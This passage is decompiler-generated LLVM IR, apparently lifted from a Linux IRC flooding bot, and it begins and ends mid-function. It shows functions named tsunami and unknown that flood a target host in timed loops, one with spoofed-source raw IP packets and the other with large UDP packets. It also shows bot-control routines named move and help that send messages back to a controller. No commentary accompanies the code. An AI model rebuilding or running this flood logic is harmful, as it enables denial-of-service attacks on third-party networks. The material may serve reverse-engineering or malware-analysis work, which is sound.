  %v3_8049a02 = inttoptr i32 %v2_8049a02 to i32*
  store i32 52, i32* %v3_8049a02, align 4
  %v2_8049a03 = add i32 %v0_80499f3, 8
  %v3_8049a03 = inttoptr i32 %v2_8049a03 to i32*
  store i32 %v2_80499b9, i32* %v3_8049a03, align 4
  %v3_8049a04 = inttoptr i32 %v1_80499cf to i16*
  %v4_8049a04 = call i32 @in_cksum(i16* %v3_8049a04, i32 ptrtoint (i32* @0 to i32))
  %v0_8049a09 = load i32, i32* @esp, align 4
  store i32 60, i32* %edx.global-to-local, align 4
  %v1_8049a1f = add i32 %v0_8049a09, -4
  %v2_8049a1f = inttoptr i32 %v1_8049a1f to i32*
  store i32 16, i32* %v2_8049a1f, align 4
  %v2_8049a21 = add i32 %v0_8049a09, -8
  %v3_8049a21 = inttoptr i32 %v2_8049a21 to i32*
  store i32 %v2_8049a10, i32* %v3_8049a21, align 4
  %v1_8049a22 = add i32 %v0_8049a09, -12
  %v2_8049a22 = inttoptr i32 %v1_8049a22 to i32*
  store i32 0, i32* %v2_8049a22, align 4
  %v0_8049a24 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049a24 = add i32 %v0_8049a09, -16
  %v3_8049a24 = inttoptr i32 %v2_8049a24 to i32*
  store i32 %v0_8049a24, i32* %v3_8049a24, align 4
  %v2_8049a28 = add i32 %v0_8049a09, -20
  %v3_8049a28 = inttoptr i32 %v2_8049a28 to i32*
  store i32 %v2_804992b, i32* %v3_8049a28, align 4
  %v5_8049a29 = add i32 %v0_8049a09, -24
  %v6_8049a29 = inttoptr i32 %v5_8049a29 to i32*
  store i32 %v3_804973b, i32* %v6_8049a29, align 4
  %v1_8049a2c = load i32, i32* %stack_var_-64, align 4
  %sext16 = mul i32 %v4_8049a04, 65536
  %v2_8049a2c = sdiv i32 %sext16, 65536
  %v7_8049a2c = call i32 @sendto(i32 %v2_8049a2c, i32 %v1_8049a2c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %tmp85 = icmp ult i32 %stack_var_-44.0, 50
  br i1 %tmp85, label %dec_label_pc_8049a64, label %dec_label_pc_8049a3a

dec_label_pc_8049a3a:                             ; preds = %dec_label_pc_80498b5
  %v0_8049a31 = load i32, i32* @esp, align 4
  %v1_8049a3d = add i32 %v0_8049a31, 16
  %v2_8049a3d = inttoptr i32 %v1_8049a3d to i32*
  store i32 0, i32* %v2_8049a3d, align 4
  %v2_8049a3f = inttoptr i32 %v2_8049a2c to i32*
  %v3_8049a3f = call i32 @__GI_time(i32* %v2_8049a3f)
  %v0_8049a44 = load i32, i32* @esp, align 4
  store i32 %v3_8049a3f, i32* %edx.global-to-local, align 4
  %v7_8049a4f = icmp ult i32 %v3_8049a3f, %v5_8049a4c
  br i1 %v7_8049a4f, label %dec_label_pc_8049a64, label %dec_label_pc_8049a53

dec_label_pc_8049a53:                             ; preds = %dec_label_pc_8049a3a
  %v2_8049a56 = inttoptr i32 %v0_8049a44 to i32*
  store i32 0, i32* %v2_8049a56, align 4
  %v2_8049a58 = call i32 @__GI_exit(i32 %v2_8049a2c)
  br label %dec_label_pc_8049a64

dec_label_pc_8049a64:                             ; preds = %dec_label_pc_8049a53, %dec_label_pc_8049a3a, %dec_label_pc_80498b5
  %stack_var_-44.1 = phi i32 [ %stack_var_-44.0, %dec_label_pc_80498b5 ], [ 0, %dec_label_pc_8049a3a ], [ 0, %dec_label_pc_8049a53 ]
  %v4_8049a64 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_804988d

dec_label_pc_8049a6c:                             ; preds = %entry
  ret i32 %v1_80496f9

; uselistorder directives
  uselistorder i32 %v2_8049a2c, { 2, 1, 0 }
  uselistorder i32 %v0_80499d4, { 1, 0, 2 }
  uselistorder i32 %v1_80499cf, { 2, 1, 0 }
  uselistorder i32 %v0_80499af, { 2, 0, 1 }
  uselistorder i16 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %stack_var_-44.0, { 1, 0 }
  uselistorder i32 %storemerge84, { 2, 3, 0, 1 }
  uselistorder i32 %v4_8049709, { 1, 0 }
  uselistorder i16* %stack_var_-84, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80498b5, { 1, 0 }
  uselistorder label %dec_label_pc_804975f, { 1, 0 }
  uselistorder label %dec_label_pc_8049773.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804972f, { 1, 0 }
}

define i32 @tsunami(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-80 = alloca i16, align 2
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %v2_8049a84 = call i32 @__GI_time(i32* null)
  store i32 %v2_8049a84, i32* @eax, align 4
  %v1_8049a95 = call i32 @mfork(i32 %arg2)
  %v1_8049a9d = icmp eq i32 %v1_8049a95, 0
  %v1_8049a9f = icmp eq i1 %v1_8049a9d, false
  br i1 %v1_8049a9f, label %dec_label_pc_8049db9, label %dec_label_pc_8049aa5

dec_label_pc_8049aa5:                             ; preds = %entry
  %v4_8049aa5 = add i32 %arg3, -1
  %v9_8049aa5 = sub i32 0, %arg3
  %v10_8049aa5 = and i32 %arg3, %v9_8049aa5
  %v11_8049aa5 = icmp slt i32 %v10_8049aa5, 0
  %v12_8049aa5 = icmp eq i32 %v4_8049aa5, 0
  %v13_8049aa5 = icmp slt i32 %v4_8049aa5, 0
  %v3_8049aa9 = icmp eq i1 %v13_8049aa5, %v11_8049aa5
  %v4_8049aa9 = icmp eq i1 %v12_8049aa5, false
  %v5_8049aa9 = and i1 %v4_8049aa9, %v3_8049aa9
  br i1 %v5_8049aa9, label %dec_label_pc_8049aa5.dec_label_pc_8049acb_crit_edge, label %dec_label_pc_8049aab

dec_label_pc_8049aa5.dec_label_pc_8049acb_crit_edge: ; preds = %dec_label_pc_8049aa5
  br label %dec_label_pc_8049acb

dec_label_pc_8049aab:                             ; preds = %dec_label_pc_8049aa5
  %v3_8049ab9 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_805a8d0.75 to i32))
  %v1_8049ac6 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8049acb

dec_label_pc_8049acb:                             ; preds = %dec_label_pc_8049aa5.dec_label_pc_8049acb_crit_edge, %dec_label_pc_8049aab
  %v1_8049ace = add i32 %arg4, 8
  %v1_8049ad1 = inttoptr i32 %v1_8049ace to i32*
  %v2_8049ad1 = load i32, i32* %v1_8049ad1, align 4
  %v1_8049ad7 = call i32 @atol(i32 %v2_8049ad1)
  %v4_8049aee = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_8049af9 = icmp slt i32 %v4_8049aee, 0
  %v1_8049afd = icmp eq i1 %v5_8049af9, false
  br i1 %v1_8049afd, label %dec_label_pc_8049b09, label %dec_label_pc_8049aff

dec_label_pc_8049aff:                             ; preds = %dec_label_pc_8049acb
  %v1_8049b04 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8049b09

dec_label_pc_8049b09:                             ; preds = %dec_label_pc_8049acb, %dec_label_pc_8049aff
  %v2_8049b0e = call i32 @__GI_time(i32* null)
  store i32 %v2_8049b0e, i32* @ebx, align 4
  %v1_8049b18 = call i32 @__libc_getpid(i32 0)
  %v1_8049b1d = load i32, i32* @ebx, align 4
  %v2_8049b1d = xor i32 %v1_8049b1d, %v1_8049b18
  %v1_8049b23 = call i32 @srand(i32 %v2_8049b1d)
  %v0_8049b2b = call i32 @random()
  %v2_8049b37 = ptrtoint i8* %stack_var_-100 to i32
  %v15_8049b3a = ptrtoint i32* %stack_var_-60 to i32
  %v4_8049b3e = bitcast i32* %stack_var_-60 to i8*
  %v5_8049b3e = call i32 @__GI_memset(i8* %v4_8049b3e, i32 %v0_8049b2b, i32 1400)
  %v1_8049b49 = add i32 %arg4, 4
  %v1_8049b4c = inttoptr i32 %v1_8049b49 to i32*
  %v2_8049b4c = load i32, i32* %v1_8049b4c, align 4
  %v3_8049b55 = call i32 @host2ip(i32 %arg2, i32 %v2_8049b4c)
  %v3_8049b74 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_805a8f4.76 to i32))
  %v2_8049cf8 = ptrtoint i32* %stack_var_-152 to i32
  %v2_8049cfe = ptrtoint i32* %stack_var_-140 to i32
  %v15_8049d04 = ptrtoint i16* %stack_var_-80 to i32
  %v12_8049d22 = ptrtoint i32* %stack_var_-120 to i32
  %v2_8049d4f = ptrtoint i32* %stack_var_-168 to i32
  %v5_8049d8b = add i32 %v1_8049ad7, %v2_8049a84
  br label %dec_label_pc_8049b7c

dec_label_pc_8049b7c:                             ; preds = %dec_label_pc_8049d99, %dec_label_pc_8049b09
  %stack_var_-32.0 = phi i32 [ %tmp, %dec_label_pc_8049b09 ], [ %v4_8049d99, %dec_label_pc_8049d99 ]
  %v0_8049b7c = call i32 @getspoof()
  store i8 69, i8* %stack_var_-100, align 1
  %v0_8049bab = load i32, i32* @esp, align 4
  %v2_8049bae = add i32 %v0_8049bab, -16
  %v3_8049bae = inttoptr i32 %v2_8049bae to i32*
  store i32 1440, i32* %v3_8049bae, align 4
  %v2_8049baf = call i32 @htons(i32 69)
  %v1_8049bbb = call i32 @random()
  %v1_8049be4 = call i32 @random()
  %v2_8049be4 = trunc i32 %v1_8049be4 to i16
  store i16 %v2_8049be4, i16* %stack_var_-80, align 2
  %v2_8049bed = call i32 @random()
  %v1_8049bf6 = call i32 @random()
  %v1_8049bfe = call i32 @random()
  store i32 2, i32* %stack_var_-168, align 4
  %v0_8049c95 = load i32, i32* @esp, align 4
  %v1_8049c95 = add i32 %v0_8049c95, -4
  %v2_8049c95 = inttoptr i32 %v1_8049c95 to i32*
  store i32 20, i32* %v2_8049c95, align 4
  %v2_8049c97 = add i32 %v0_8049c95, -8
  %v3_8049c97 = inttoptr i32 %v2_8049c97 to i32*
  store i32 %v2_8049b37, i32* %v3_8049c97, align 4
  %v0_8049c98 = load i32, i32* %stack_var_-168, align 4
  %sext5 = mul i32 %v2_8049bed, 65536
  %v2_8049c98 = sdiv i32 %sext5, 65536
  %v3_8049c98 = inttoptr i32 %v0_8049c98 to i16*
  %v4_8049c98 = call i32 @in_cksum(i16* %v3_8049c98, i32 %v2_8049c98)
  %v0_8049c9d = load i32, i32* @esp, align 4
  %v1_8049ca7 = add i32 %v0_8049c9d, 4
  %v2_8049ca7 = inttoptr i32 %v1_8049ca7 to i32*
  store i32 40, i32* %v2_8049ca7, align 4
  %v3_8049ca9 = inttoptr i32 %v0_8049c9d to i32*
  store i32 %v2_8049b37, i32* %v3_8049ca9, align 4
  %sext6 = mul i32 %v4_8049c98, 65536
  %v1_8049caa = sdiv i32 %sext6, 65536
  %v3_8049caa = inttoptr i32 %v1_8049caa to i16*
  %v4_8049caa = call i32 @in_cksum(i16* %v3_8049caa, i32 ptrtoint (i32* @0 to i32))
  %v0_8049caf = load i32, i32* @esp, align 4
  store i32 %v0_8049b7c, i32* %stack_var_-152, align 4
  %v2_8049ce8 = add i32 %v0_8049caf, -8
  %v3_8049ce8 = inttoptr i32 %v2_8049ce8 to i32*
  store i32 1420, i32* %v3_8049ce8, align 4
  %v0_8049ce9 = load i32, i32* %stack_var_-152, align 4
  %v1_8049ce9 = call i32 @htons(i32 %v0_8049ce9)
  %v0_8049cee = load i32, i32* @esp, align 4
  store i32 %v2_8049cfe, i32* %edx.global-to-local, align 4
  %v1_8049d0a = add i32 %v0_8049cee, 8
  %v2_8049d0a = inttoptr i32 %v1_8049d0a to i32*
  store i32 20, i32* %v2_8049d0a, align 4
  %v2_8049d0c = add i32 %v0_8049cee, 4
  %v3_8049d0c = inttoptr i32 %v2_8049d0c to i32*
  store i32 %v2_8049cfe, i32* %v3_8049d0c, align 4
  %v3_8049d0d = inttoptr i32 %v0_8049cee to i32*
  store i32 %v15_8049d04, i32* %v3_8049d0d, align 4
  %sext7 = mul i32 %v1_8049ce9, 65536
  %v1_8049d0e = sdiv i32 %sext7, 65536
  %v4_8049d0e = call i32 @bcopy(i32 %v1_8049d0e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049d13 = load i32, i32* @esp, align 4
  %v5_8049d19 = add i32 %v0_8049d13, 8
  %v6_8049d19 = inttoptr i32 %v5_8049d19 to i32*
  store i32 1400, i32* %v6_8049d19, align 4
  %v2_8049d25 = add i32 %v0_8049d13, 4
  %v3_8049d25 = inttoptr i32 %v2_8049d25 to i32*
  store i32 %v12_8049d22, i32* %v3_8049d25, align 4
  %v3_8049d2c = inttoptr i32 %v0_8049d13 to i32*
  store i32 %v15_8049b3a, i32* %v3_8049d2c, align 4
  %v4_8049d2d = call i32 @bcopy(i32 %v1_8049d0e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049d32 = load i32, i32* @esp, align 4
  store i32 %v2_8049cf8, i32* %edx.global-to-local, align 4
  %v2_8049d41 = add i32 %v0_8049d32, 12
  %v3_8049d41 = inttoptr i32 %v2_8049d41 to i32*
  store i32 1432, i32* %v3_8049d41, align 4
  %v2_8049d42 = add i32 %v0_8049d32, 8
  %v3_8049d42 = inttoptr i32 %v2_8049d42 to i32*
  store i32 %v2_8049cf8, i32* %v3_8049d42, align 4
  %v3_8049d43 = inttoptr i32 %v1_8049d0e to i16*
  %v4_8049d43 = call i32 @in_cksum(i16* %v3_8049d43, i32 ptrtoint (i32* @0 to i32))
  %v0_8049d48 = load i32, i32* @esp, align 4
  store i32 1440, i32* %edx.global-to-local, align 4
  %v1_8049d5e = add i32 %v0_8049d48, -4
  %v2_8049d5e = inttoptr i32 %v1_8049d5e to i32*
  store i32 16, i32* %v2_8049d5e, align 4
  %v2_8049d60 = add i32 %v0_8049d48, -8
  %v3_8049d60 = inttoptr i32 %v2_8049d60 to i32*
  store i32 %v2_8049d4f, i32* %v3_8049d60, align 4
  %v1_8049d61 = add i32 %v0_8049d48, -12
  %v2_8049d61 = inttoptr i32 %v1_8049d61 to i32*
  store i32 0, i32* %v2_8049d61, align 4
  %v0_8049d63 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049d63 = add i32 %v0_8049d48, -16
  %v3_8049d63 = inttoptr i32 %v2_8049d63 to i32*
  store i32 %v0_8049d63, i32* %v3_8049d63, align 4
  %v2_8049d67 = add i32 %v0_8049d48, -20
  %v3_8049d67 = inttoptr i32 %v2_8049d67 to i32*
  store i32 %v2_8049b37, i32* %v3_8049d67, align 4
  %v5_8049d68 = add i32 %v0_8049d48, -24
  %v6_8049d68 = inttoptr i32 %v5_8049d68 to i32*
  store i32 %v4_8049aee, i32* %v6_8049d68, align 4
  %v1_8049d6b = load i32, i32* %stack_var_-60, align 4
  %sext10 = mul i32 %v4_8049d43, 65536
  %v2_8049d6b = sdiv i32 %sext10, 65536
  %v7_8049d6b = call i32 @sendto(i32 %v2_8049d6b, i32 %v1_8049d6b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %tmp71 = icmp ult i32 %stack_var_-32.0, 50
  br i1 %tmp71, label %dec_label_pc_8049d99, label %dec_label_pc_8049d79

dec_label_pc_8049d79:                             ; preds = %dec_label_pc_8049b7c
  %v0_8049d70 = load i32, i32* @esp, align 4
  %v1_8049d7c = add i32 %v0_8049d70, 16
  %v2_8049d7c = inttoptr i32 %v1_8049d7c to i32*
  store i32 0, i32* %v2_8049d7c, align 4
  %v2_8049d7e = inttoptr i32 %v2_8049d6b to i32*
  %v3_8049d7e = call i32 @__GI_time(i32* %v2_8049d7e)
  %v0_8049d83 = load i32, i32* @esp, align 4
  store i32 %v3_8049d7e, i32* %edx.global-to-local, align 4
  %v7_8049d8e = icmp ult i32 %v3_8049d7e, %v5_8049d8b
  %v1_8049d90 = icmp eq i1 %v7_8049d8e, false
  br i1 %v1_8049d90, label %dec_label_pc_8049da1, label %dec_label_pc_8049d99

dec_label_pc_8049d99:                             ; preds = %dec_label_pc_8049d79, %dec_label_pc_8049b7c
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_8049b7c ], [ 0, %dec_label_pc_8049d79 ]
  %v4_8049d99 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_8049b7c

dec_label_pc_8049da1:                             ; preds = %dec_label_pc_8049d79
  %v6_8049da4 = inttoptr i32 %v0_8049d83 to i32*
  store i32 %v4_8049aee, i32* %v6_8049da4, align 4
  %v1_8049da7 = call i32 @close(i32 %stack_var_-32.0)
  %v0_8049dac = load i32, i32* @esp, align 4
  %v2_8049db2 = inttoptr i32 %v0_8049dac to i32*
  store i32 0, i32* %v2_8049db2, align 4
  %v1_8049db4 = call i32 @__GI_exit(i32 %stack_var_-32.0)
  br label %dec_label_pc_8049db9

dec_label_pc_8049db9:                             ; preds = %entry, %dec_label_pc_8049da1
  %v0_8049dbd = phi i32 [ %v1_8049a95, %entry ], [ %v1_8049db4, %dec_label_pc_8049da1 ]
  ret i32 %v0_8049dbd

; uselistorder directives
  uselistorder i32 %v2_8049d6b, { 1, 0 }
  uselistorder i32 %v0_8049d13, { 1, 0, 2 }
  uselistorder i32 %v1_8049d0e, { 2, 1, 0 }
  uselistorder i32 %v0_8049cee, { 2, 0, 1 }
  uselistorder i32 %stack_var_-32.0, { 0, 1, 3, 2 }
  uselistorder i32 %v4_8049aa5, { 1, 0 }
  uselistorder i8* %stack_var_-100, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i16* %stack_var_-80, { 1, 0 }
  uselistorder i32 1440, { 1, 0 }
  uselistorder i8 69, { 1, 2, 0 }
  uselistorder i32 ()* @getspoof, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049db9, { 1, 0 }
  uselistorder label %dec_label_pc_8049b09, { 1, 0 }
  uselistorder label %dec_label_pc_8049acb, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_8049dd3 = call i32 @malloc(i32 9216)
  %v2_8049de3 = call i32 @__GI_time(i32* null)
  store i32 %v2_8049de3, i32* @eax, align 4
  %v1_8049df4 = call i32 @mfork(i32 %arg2)
  %v1_8049dfc = icmp eq i32 %v1_8049df4, 0
  %v1_8049dfe = icmp eq i1 %v1_8049dfc, false
  br i1 %v1_8049dfe, label %dec_label_pc_8049f43, label %dec_label_pc_8049e04

dec_label_pc_8049e04:                             ; preds = %entry
  %v4_8049e04 = add i32 %arg3, -1
  %v9_8049e04 = sub i32 0, %arg3
  %v10_8049e04 = and i32 %arg3, %v9_8049e04
  %v11_8049e04 = icmp slt i32 %v10_8049e04, 0
  %v12_8049e04 = icmp eq i32 %v4_8049e04, 0
  %v13_8049e04 = icmp slt i32 %v4_8049e04, 0
  %v3_8049e08 = icmp eq i1 %v13_8049e04, %v11_8049e04
  %v4_8049e08 = icmp eq i1 %v12_8049e04, false
  %v5_8049e08 = and i1 %v4_8049e08, %v3_8049e08
  br i1 %v5_8049e08, label %dec_label_pc_8049e04.dec_label_pc_8049e2a_crit_edge, label %dec_label_pc_8049e0a

dec_label_pc_8049e04.dec_label_pc_8049e2a_crit_edge: ; preds = %dec_label_pc_8049e04
  br label %dec_label_pc_8049e2a

dec_label_pc_8049e0a:                             ; preds = %dec_label_pc_8049e04
  %v3_8049e18 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_805a918.77 to i32))
  %v1_8049e25 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8049e2a

dec_label_pc_8049e2a:                             ; preds = %dec_label_pc_8049e04.dec_label_pc_8049e2a_crit_edge, %dec_label_pc_8049e0a
  %v1_8049e2d = add i32 %arg4, 8
  %v1_8049e30 = inttoptr i32 %v1_8049e2d to i32*
  %v2_8049e30 = load i32, i32* %v1_8049e30, align 4
  %v1_8049e36 = call i32 @atol(i32 %v2_8049e30)
  %v2_8049e48 = ptrtoint i32* %stack_var_-48 to i32
  %v4_8049e4c = bitcast i32* %stack_var_-48 to i8*
  %v5_8049e4c = call i32 @__GI_memset(i8* %v4_8049e4c, i32 0, i32 16)
  %v1_8049e57 = add i32 %arg4, 4
  %v1_8049e5a = inttoptr i32 %v1_8049e57 to i32*
  %v2_8049e5a = load i32, i32* %v1_8049e5a, align 4
  %v3_8049e63 = call i32 @host2ip(i32 %arg2, i32 %v2_8049e5a)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_8049e88 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_805a93c.78 to i32))
  %v5_8049f15 = add i32 %v1_8049e36, %v2_8049de3
  %v2_8049ebd = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_8049e90

dec_label_pc_8049e90:                             ; preds = %dec_label_pc_8049f23, %dec_label_pc_8049e2a
  %stack_var_-24.0 = phi i32 [ %tmp, %dec_label_pc_8049e2a ], [ %v4_8049f23, %dec_label_pc_8049f23 ]
  %v0_8049e90 = call i32 @random()
  %v4_8049ea2 = call i32 @socket(i32 2, i32 2, i32 17)
  %v5_8049ead = icmp slt i32 %v4_8049ea2, 0
  br i1 %v5_8049ead, label %dec_label_pc_8049efd, label %dec_label_pc_8049eb3

dec_label_pc_8049eb3:                             ; preds = %dec_label_pc_8049e90
  store i32 1, i32* %stack_var_-32, align 4
  %v4_8049ec9 = call i32 @ioctl(i32 %v4_8049ea2, i32 21537, i32 %v2_8049ebd)
  %v7_8049ee7 = call i32 @sendto(i32 %v4_8049ea2, i32 %v1_8049dd3, i32 9216, i32 0, i32 %v2_8049e48, i32 16)
  %v1_8049ef5 = call i32 @close(i32 %v4_8049ea2)
  br label %dec_label_pc_8049efd

dec_label_pc_8049efd:                             ; preds = %dec_label_pc_8049e90, %dec_label_pc_8049eb3
  %v7_8049f01 = icmp sgt i32 %stack_var_-24.0, 49
  br i1 %v7_8049f01, label %dec_label_pc_8049f03, label %dec_label_pc_8049f23

dec_label_pc_8049f03:                             ; preds = %dec_label_pc_8049efd
  %v2_8049f08 = call i32 @__GI_time(i32* null)
  %v7_8049f18 = icmp ult i32 %v2_8049f08, %v5_8049f15
  %v1_8049f1a = icmp eq i1 %v7_8049f18, false
  br i1 %v1_8049f1a, label %dec_label_pc_8049f2b, label %dec_label_pc_8049f23

dec_label_pc_8049f23:                             ; preds = %dec_label_pc_8049f03, %dec_label_pc_8049efd
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049efd ], [ 0, %dec_label_pc_8049f03 ]
  %v4_8049f23 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_8049e90

dec_label_pc_8049f2b:                             ; preds = %dec_label_pc_8049f03
  %v1_8049f31 = call i32 @close(i32 %v4_8049ea2)
  %v1_8049f3e = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8049f43

dec_label_pc_8049f43:                             ; preds = %entry, %dec_label_pc_8049f2b
  %v0_8049f44 = phi i32 [ %v1_8049df4, %entry ], [ %v1_8049f3e, %dec_label_pc_8049f2b ]
  ret i32 %v0_8049f44

; uselistorder directives
  uselistorder i32 %v4_8049e04, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendto, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @host2ip, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @atol, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049f43, { 1, 0 }
  uselistorder label %dec_label_pc_8049efd, { 1, 0 }
  uselistorder label %dec_label_pc_8049e2a, { 1, 0 }
}

define i32 @move(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp20 = icmp slt i32 %arg3, 1
  %tmp21 = icmp eq i1 %tmp20, false
  br i1 %tmp21, label %entry.dec_label_pc_8049f71_crit_edge, label %dec_label_pc_8049f51

entry.dec_label_pc_8049f71_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8049f71

dec_label_pc_8049f51:                             ; preds = %entry
  %v3_8049f5f = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_805a957.79 to i32))
  %v1_8049f6c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8049f71

dec_label_pc_8049f71:                             ; preds = %entry.dec_label_pc_8049f71_crit_edge, %dec_label_pc_8049f51
  %v1_8049f74 = add i32 %arg4, 4
  %v1_8049f77 = inttoptr i32 %v1_8049f74 to i32*
  %v2_8049f77 = load i32, i32* %v1_8049f77, align 4
  %v1_8049f7d = inttoptr i32 %v2_8049f77 to i8*
  %v2_8049f7d = call i32 @__GI_strdup(i8* %v1_8049f7d)
  store i32 %v2_8049f7d, i32* @global_var_8067640.80, align 64
  store i32 1, i32* @global_var_8062a80.81, align 128
  %v1_8049f9a = call i32 @close(i32 %arg1)
  ret i32 %v1_8049f9a

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049f71, { 1, 0 }
}

define i32 @help(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8049fb0 = call i32 @mfork(i32 %arg2)
  %v1_8049fb8 = icmp eq i32 %v1_8049fb0, 0
  %v1_8049fba = icmp eq i1 %v1_8049fb8, false
  br i1 %v1_8049fba, label %dec_label_pc_804a210, label %dec_label_pc_8049fc0

dec_label_pc_8049fc0:                             ; preds = %entry
  %v3_8049fce = call i32 @Send(i32 %arg1, i32 ptrtoint ([119 x i8]* @global_var_805a974.82 to i32))
  %v1_8049fdb = call i32 @sleep(i32 2)
  %v3_8049ff1 = call i32 @Send(i32 %arg1, i32 ptrtoint ([123 x i8]* @global_var_805a9ec.83 to i32))
  %v1_8049ffe = call i32 @sleep(i32 2)
  %v3_804a014 = call i32 @Send(i32 %arg1, i32 ptrtoint ([77 x i8]* @global_var_805aa68.84 to i32))
  %v1_804a021 = call i32 @sleep(i32 2)
  %v3_804a037 = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_805aab8.85 to i32))
  %v1_804a044 = call i32 @sleep(i32 2)
  %v3_804a05a = call i32 @Send(i32 %arg1, i32 ptrtoint ([94 x i8]* @global_var_805ab18.86 to i32))
  %v1_804a067 = call i32 @sleep(i32 2)
  %v3_804a07d = call i32 @Send(i32 %arg1, i32 ptrtoint ([79 x i8]* @global_var_805ab78.87 to i32))
  %v1_804a08a = call i32 @sleep(i32 2)
  %v3_804a0a0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([89 x i8]* @global_var_805abc8.88 to i32))
  %v1_804a0ad = call i32 @sleep(i32 2)
  %v3_804a0c3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_805ac24.89 to i32))
  %v1_804a0d0 = call i32 @sleep(i32 2)
  %v3_804a0e6 = call i32 @Send(i32 %arg1, i32 ptrtoint ([103 x i8]* @global_var_805ac80.90 to i32))
  %v1_804a0f3 = call i32 @sleep(i32 2)
  %v3_804a109 = call i32 @Send(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_805ace8.91 to i32))
  %v1_804a116 = call i32 @sleep(i32 2)
  %v3_804a12c = call i32 @Send(i32 %arg1, i32 ptrtoint ([80 x i8]* @global_var_805ad50.92 to i32))
  %v1_804a139 = call i32 @sleep(i32 2)
  %v3_804a14f = call i32 @Send(i32 %arg1, i32 ptrtoint ([117 x i8]* @global_var_805ada0.93 to i32))
  %v1_804a15c = call i32 @sleep(i32 2)
  %v3_804a172 = call i32 @Send(i32 %arg1, i32 ptrtoint ([90 x i8]* @global_var_805ae18.94 to i32))
  %v1_804a17f = call i32 @sleep(i32 2)
  %v3_804a195 = call i32 @Send(i32 %arg1, i32 ptrtoint ([91 x i8]* @global_var_805ae74.95 to i32))
  %v1_804a1a2 = call i32 @sleep(i32 2)
  %v3_804a1b8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([77 x i8]* @global_var_805aed0.96 to i32))
  %v3_804a1ce = call i32 @Send(i32 %arg1, i32 ptrtoint ([96 x i8]* @global_var_805af20.97 to i32))
  %v1_804a1db = call i32 @sleep(i32 2)
  %v3_804a1f1 = call i32 @Send(i32 %arg1, i32 ptrtoint ([82 x i8]* @global_var_805af80.98 to i32))
  %v1_804a1fe = call i32 @sleep(i32 2)
  %v1_804a20b = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804a210

dec_label_pc_804a210:                             ; preds = %entry, %dec_label_pc_8049fc0
